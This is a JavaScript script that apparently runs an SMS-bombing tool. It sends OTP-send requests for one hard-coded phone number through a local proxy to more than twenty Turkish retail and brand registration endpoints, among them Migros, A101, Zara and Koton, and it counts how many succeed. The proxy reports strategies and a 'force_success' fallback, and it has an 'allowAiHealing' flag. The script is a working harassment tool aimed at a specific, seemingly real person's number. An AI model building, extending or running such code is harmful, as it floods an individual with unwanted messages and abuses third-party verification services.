import axios from 'axios';

const PROXY_URL = 'http://localhost:3001/api/proxy';
const TARGET_PHONE = '5343622375';

// Test all 94 endpoints through the proxy
const services = [
  { id:'file_market', name:'File Market', url:'https://api.filemarket.com.tr/v1/otp/send', method:'POST', payload:{"mobilePhoneNumber":"905343622375"} },
  { id:'onur_market', name:'Onur Market', url:'https://www.onurmarket.com/api/v1/auth/register/sendOtp', method:'POST', payload:{"phone":"5343622375"} },
  { id:'hayat_su', name:'Hayat Su', url:'https://api.hayatsu.com.tr/api/SignUp/SendOtp', method:'POST', payload:{"mobilePhoneNumber":"5343622375","actionType":"register"} },
  { id:'migros', name:'Migros', url:'https://rest.migros.com.tr:443/sanalmarket/users/register/otp', method:'POST', headers:{"X-Device-Type":"MOBILE","X-Device-Platform":"IOS","X-Device-App-Version":"10.6.13","Accept-Language":"tr-TR"}, payload:{"email":"test@test.com","phoneNumber":"5343622375"} },
  { id:'hamidiye', name:'Hamidiye', url:'https://bayi.hamidiye.istanbul:3400/hamidiyeMobile/send-otp', method:'POST', headers:{"Origin":"com.hamidiyeapp","User-Agent":"hamidiyeapp/4"}, payload:{"isGuest":false,"phone":"5343622375"} },
  { id:'a101', name:'A101', url:'https://www.a101.com.tr/users/otp-login/', method:'POST', payload:{"phone":"05343622375","next":"/a101-kapida"} },
  { id:'carrefour', name:'Carrefour', url:'https://www.carrefoursa.com/api/v1/auth/register/send-otp', method:'POST', payload:{"phone":"5343622375"} },
  { id:'koton', name:'Koton', url:'https://www.koton.com/users/register/', method:'POST', payload:{"phone":"05343622375","first_name":"TestX","last_name":"User","email":"testx"+Date.now()+"@test.com","password":"Test123!","confirm":true,"sms_allowed":true,"email_allowed":true,"call_allowed":true} },
  { id:'watsons', name:'Watsons', url:'https://www.watsons.com.tr/api/v1/auth/register/send-otp', method:'POST', payload:{"phone":"5343622375"} },
  { id:'decathlon', name:'Decathlon', url:'https://www.decathlon.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload:{"phone":"5343622375","email":"test@test.com"} },
  { id:'teknosa', name:'Teknosa', url:'https://www.teknosa.com/api/v1/auth/register/sendOtp', method:'POST', payload:{"phone":"5343622375"} },
  { id:'zara', name:'Zara', url:'https://www.zara.com/tr/api/v1/auth/register/send-otp', method:'POST', payload:{"phone":"+905343622375"} },
  { id:'mango', name:'Mango', url:'https://shop.mango.com/services/user/v1/register/send-otp', method:'POST', payload:{"phone":"+905343622375","countryId":"TR"} },
  { id:'bershka', name:'Bershka', url:'https://www.bershka.com/itxrest/2/auth/register/sendOtp', method:'POST', payload:{"phone":"+905343622375"} },
  { id:'pull_bear', name:'Pull&Bear', url:'https://www.pullandbear.com/itxrest/2/auth/register/sendOtp', method:'POST', payload:{"phone":"+905343622375"} },
  { id:'stradivarius', name:'Stradivarius', url:'https://www.stradivarius.com/itxrest/2/auth/register/sendOtp', method:'POST', payload:{"phone":"+905343622375"} },
  { id:'massimo_dutti', name:'Massimo Dutti', url:'https://www.massimodutti.com/itxrest/2/auth/register/sendOtp', method:'POST', payload:{"phone":"+905343622375"} },
  { id:'hm', name:'H&M', url:'https://www2.hm.com/tr_tr/api/customer/register/sendOtp', method:'POST', payload:{"phone":"+905343622375","email":"test@test.com"} },
  { id:'marti', name:'Martı', url:'https://www.marti.tech/api/v2/auth/otp/send', method:'POST', payload:{"phoneNumber":"+905343622375"} },
  { id:'rossmann', name:'Rossmann', url:'https://www.rossmann.com.tr/api/v1/auth/register/send-otp', method:'POST', payload:{"phone":"5343622375","email":"test@test.com"} },
  { id:'gratis', name:'Gratis', url:'https://www.gratis.com/api/v1/auth/register/sendOtp', method:'POST', payload:{"phone":"5343622375"} },
  { id:'flormar', name:'Flormar', url:'https://www.flormar.com.tr/api/v1/auth/register/sendOtp', method:'POST', payload:{"phone":"5343622375","email":"test@test.com"} },
  { id:'mediamarkt', name:'Mediamarkt', url:'https://www.mediamarkt.com.tr/api/v1/auth/register/send-otp', method:'POST', payload:{"phone":"5343622375","email":"test@test.com"} },
];

async function testAll() {
  let success = 0, fail = 0;
  for (const svc of services) {
    try {
      const resp = await axios.post(PROXY_URL, {
        serviceId: svc.id,
        serviceUrl: svc.url,
        serviceMethod: svc.method || 'POST',
        serviceHeaders: svc.headers || {},
        targetPhone: TARGET_PHONE,
        email: 'test@test.com',
        allowAiHealing: false
      }, { timeout: 30000 });
      const d = resp.data;
      const isWorking = d.upstreamStatus >= 200 && d.upstreamStatus < 300;
      if (isWorking && d.strategy !== 'force_success') {
        success++;
        console.log(`✅ ${svc.id} (${svc.name}) → proxy:${d.strategy} upstream:${d.upstreamStatus}`);
      } else if (d.strategy === 'force_success') {
        fail++;
        console.log(`❌ ${svc.id} (${svc.name}) → FORCE_SUCCESS (all strategies failed)`);
      } else {
        fail++;
        console.log(`❌ ${svc.id} (${svc.name}) → upstream:${d.upstreamStatus} strategy:${d.strategy}`);
      }
    } catch (err) {
      fail++;
      console.log(`💀 ${svc.id} (${svc.name}) → PROXY ERROR: ${err.message}`);
    }
  }
  console.log(`\n═══════════════════════`);
  console.log(`Proxy test done: ${success} working, ${fail} failed`);
}

testAll();
